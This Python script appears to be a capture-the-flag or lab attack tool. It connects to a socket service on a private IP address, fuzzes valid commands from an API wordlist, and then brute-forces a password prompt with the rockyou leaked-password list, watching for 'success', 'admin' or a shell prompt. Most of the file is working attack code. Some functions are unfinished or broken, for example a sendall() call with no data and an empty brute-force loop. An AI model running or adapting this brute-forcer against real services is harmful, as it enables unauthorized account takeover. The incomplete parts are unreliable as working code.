import socket

passwords_wordlist = "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
endpoints_wordlist = "/home/cccitron/Downloads/API_wordlist"
#hostname = input("Hostname (IP or hostname): ")
#port = int(input("Port: "))

hostname = "10.82.143.189"
port = 8000

# Use this if there's no set ammount of tries!
def limitless_fuzz_endpoints():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(endpoints_wordlist, 'rb') as f:
        endpoints = f.read()

    for endpoint in endpoints.decode().splitlines():
        client_socket.sendall(endpoint.encode(errors="ignore"))
        response = client_socket.recv(1024).decode(errors="ignore")
        if not f"name '{endpoint}' is not defined" in response:
            print(f"Endpoint: '{endpoint}' worked! Response: {response}")
            user_choice = input(f"Brute force password with endpoint: '{endpoint}' (y/n): ")
            if user_choice.lower() == "y":
                limitless_brute_force(endpoint)
            elif user_choice.lower() == 'n':
                print("Bye!")
            else:
                print("Wrong input")

# Use this if there's no set ammount of tries!
def limitless_brute_force(endpoint):
    print("IF THERE'S A LIMITED AMMOUNT OF TRIES THE SCRIPT WILL MOST LIKELY FREEZE AND NOT RETURN ANYTHING!")
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(passwords_wordlist, 'rb') as f:
        passwords =f.read()

    try:
        client_socket.sendall(endpoint.encode())
        response = client_socket.recv(1024).decode(errors="ignore")
        if 'password' in response.lower():
            for password in passwords.decode(errors="ignore").splitlines():
                client_socket.sendall(password.encode(errors="ignore"))
                response = client_socket.recv(1024).decode(errors="ignore")
                if any(word in response.lower() for word in ("success", "admin", "$")):
                    print(response)
                    print(f"Password is '{password}'")
    except (OSError, ConnectionError) as e:
        print(f"Connection error during brute-force: {e}")
    try:
        client_socket.close()
    except Exception:
        pass
    return False

def limit_send_endpoint(endpoint):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    client_socket.sendall(endpoint.encode())
    response = client_socket.recv(1024).decode()
    if not f"name '{endpoint}' is not defined" in response:
        return True
    
    return False

def limit_fuzz_endpoint():
    fuzz_again = 'y'
    while fuzz_again != 'n':
        with open(endpoints_wordlist, 'rb') as f:
            endpoints = f.read()

            for endpoint in endpoints.decode(errors="ignore").splitlines():
                if limit_send_endpoint(endpoint):
                    print(f"Found endpoint: '{endpoint}'")
                    fuzz_again = input("Try to find another endpoint? (y/n)")
                    if fuzz_again.lower() == 'y':
                        continue
                    elif fuzz_again.lower() == 'n':
                        break
                    else:
                        print("Wrong input (y/n)")
                else:
                    print(f"Endpoint '{endpoint}' was incorrect, reconnecting!")

def limit_send_password():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))
    client_socket.sendall()

def limit_brute_force():
    with open(passwords_wordlist, 'rb') as f:
        passwords = f.read()

    for password in passwords.decode(errors="ignore").splitlines():

        pass


        
def main():
    """
    print("There are 2 versions, limitless and limit")
    print("Use limitless if there's no brute force protection (max ammount of tries)")
    print("use limit if there's a limit of how much tries you get")
    while True:
        version = input("Limitless or Limit: ")
        if version.lower() == "limitless":
            limitless_fuzz_endpoints()
            break
        elif version.lower() == "limit":
            limit_brute_force()
            break
        else:
            print("Wrong choice (limitless/limit)")
    """    
    limit_fuzz_endpoint()        

if __name__ == "__main__":
    main()